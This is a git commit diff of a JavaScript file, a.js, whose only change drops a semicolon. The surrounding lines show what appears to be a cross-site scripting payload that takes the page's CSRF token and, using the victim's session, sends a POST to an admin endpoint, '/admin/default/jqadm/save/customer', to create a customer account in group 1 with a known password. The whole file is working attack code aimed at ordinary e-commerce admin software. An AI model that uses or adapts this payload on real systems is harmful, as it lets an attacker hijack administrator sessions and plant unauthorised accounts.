96e5636ae536fc32d10d1b2de61515ce29b91c0d
Robert H <140614637+bicicleta26@users.noreply.github.com>
2023-07-26 09:21:14 -0300

    Update a.js

--- a.js
+++ a.js
@@ -2,7 +2,7 @@ var http = new XMLHttpRequest();
 var url = '/admin/default/jqadm/save/customer?locale=en';
 var params ="item[customer.id]=&next=get&item[customer.status]=1&item[customer.code]=fromconsolefinal@test.com&item[customer.password]=1234567&item[customer.groups][]=1&item[customer.languageid]=en&item[customer.lastname]=lastname&item[customer.firstname]=pepe&item[customer.city]=DR&item[customer.countryid]=AF&item[customer.email]=fromconsolefinal@test.com&item[customer.company]=XSS&uo[filter][key][1]=order.id&uo[filter][op][1]=%3d%3d&_token=" + document.getElementsByTagName("input")[0].value ;
 http.open('POST', url, true);
-http.withCredentials = true;
+http.withCredentials = true
 http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 
 http.onreadystatechange = function() {
